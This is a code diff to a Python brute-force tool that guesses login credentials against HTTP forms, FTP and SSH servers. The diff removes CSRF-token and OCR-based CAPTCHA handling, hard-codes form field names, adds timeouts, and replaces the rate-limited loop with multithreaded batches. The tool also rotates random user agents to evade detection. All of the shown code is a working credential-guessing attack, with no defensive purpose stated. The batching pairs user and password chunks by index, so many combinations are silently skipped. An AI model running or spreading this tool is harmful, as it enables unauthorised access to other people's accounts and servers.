@@ -20,60 +20,13 @@ def http_brute_force(url, usernames, passwords, request_delay, verbose):
     # User-agent generator
     ua = UserAgent()
 
-    # GET request to the login page
-    response = requests.get(url)
-    html = response.text
-
-    # Parse HTML content
-    soup = BeautifulSoup(html, "html.parser")
-
-    # Find the login form
-    form = soup.find("form")
-
-    if not form:
-        logging.error("Login form not found.")
-        return
-
-    # Find form field names
-    fields = form.find_all("input")
-    field_names = [field.get("name") for field in fields if field.get("name")]
-
-    if len(field_names) < 2:
-        logging.error("Not enough form fields found.")
-        return
-
-    # Find CSRF token or other hidden fields
-    token_name = None
-    token_value = None
-    for field in fields:
-        if field.get("type") == "hidden":
-            token_name = field.get("name")
-            token_value = field.get("value")
-            break
-
-    # Find CAPTCHA or other bot protection
-    captcha_name = None
-    captcha_value = None
-    for field in fields:
-        if field.get("type") == "image":
-            captcha_name = field.get("name")
-            captcha_url = url + "/" + field.get("src")
-            captcha_image = requests.get(captcha_url).content
-            captcha_value = pytesseract.image_to_string(captcha_image)
-            break
-
     def try_login(username, password):
         user_agent = ua.random
         headers = {"User-Agent": user_agent}
-        data = {field_names[0]: username, field_names[1]: password}
-        if token_name and token_value:
-            data[token_name] = token_value
-        if captcha_name and captcha_value:
-            data[captcha_name] = captcha_value
-
+        data = {"username": username, "password": password}  # Modify these keys according to your form fields
         try:
-            response = requests.post(url, data=data, headers=headers)
-            if "Başarısız" not in response.text and "Failed" not in response.text:
+            response = requests.post(url, data=data, headers=headers, timeout=5)
+            if "success_message" in response.text:  # Modify this condition based on successful login response
                 logging.info(f"{Fore.GREEN}Found valid credentials: {username}:{password}{Style.RESET_ALL}")
                 return True
             else:
@@ -81,20 +34,33 @@ def http_brute_force(url, usernames, passwords, request_delay, verbose):
                     logging.info(f"{Fore.RED}Invalid credentials: {username}:{password}{Style.RESET_ALL}")
                 return False
         except requests.RequestException as e:
-            logging.error(f"Request error: {e}")
+            if verbose:
+                logging.info(f"{Fore.RED}Request error: {e}{Style.RESET_ALL}")
             return False
 
-    def brute_force():
-        for username in usernames:
-            for password in passwords:
+    def brute_force_batch(user_batch, password_batch):
+        for username in user_batch:
+            for password in password_batch:
                 result = try_login(username, password)
                 if result:
                     return
-                time.sleep(request_delay)
 
-    thread = threading.Thread(target=brute_force)
-    thread.start()
-    thread.join()
+    def chunk_list(lst, chunk_size):
+        for i in range(0, len(lst), chunk_size):
+            yield lst[i:i + chunk_size]
+
+    chunk_size = 10  # Adjust this value based on performance testing
+    username_chunks = list(chunk_list(usernames, chunk_size))
+    password_chunks = list(chunk_list(passwords, chunk_size))
+
+    threads = []
+    for i in range(min(len(username_chunks), len(password_chunks))):
+        thread = threading.Thread(target=brute_force_batch, args=(username_chunks[i], password_chunks[i]))
+        threads.append(thread)
+        thread.start()
+
+    for thread in threads:
+        thread.join()
 
 def ftp_brute_force(host, usernames, passwords, port=21, request_delay=5, verbose=False):
     def try_login(username, password):
@@ -119,7 +85,7 @@ def ssh_brute_force(host, usernames, passwords, port=22, request_delay=5, verbos
         try:
             ssh = paramiko.SSHClient()
             ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-            ssh.connect(host, port=port, username=username, password=password)
+            ssh.connect(host, port=port, username=username, password=password, timeout=5)
             logging.info(f"{Fore.GREEN}Found valid credentials: {username}:{password}{Style.RESET_ALL}")
             ssh.close()
             return True
@@ -128,7 +94,7 @@ def ssh_brute_force(host, usernames, passwords, port=22, request_delay=5, verbos
                 logging.info(f"{Fore.RED}Invalid credentials: {username}:{password}{Style.RESET_ALL}")
             return False
         except Exception as e:
-            logging.error(f"Connection error: {e}")
+            logging.error(f"{Fore.RED}Connection error: {e}{Style.RESET_ALL}")
             return False
 
     for username in usernames:
